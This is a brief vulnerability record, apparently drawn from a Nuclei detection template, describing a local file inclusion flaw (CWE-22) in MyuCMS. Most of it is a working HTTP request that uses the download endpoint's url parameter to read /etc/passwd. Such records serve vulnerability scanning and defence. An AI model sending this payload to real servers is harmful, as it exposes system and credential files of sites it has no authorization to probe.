# Vulnerability: MyuCMS - Local File Inclusion
**Classification:** CWE-22
**Source:** Nuclei Template (`myucms-lfr.yaml`)

## Description
MyuCMS is vulnerable to local file inclusion.

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/index.php/bbs/index/download?url=/etc/passwd&name=1.txt&local=1
```

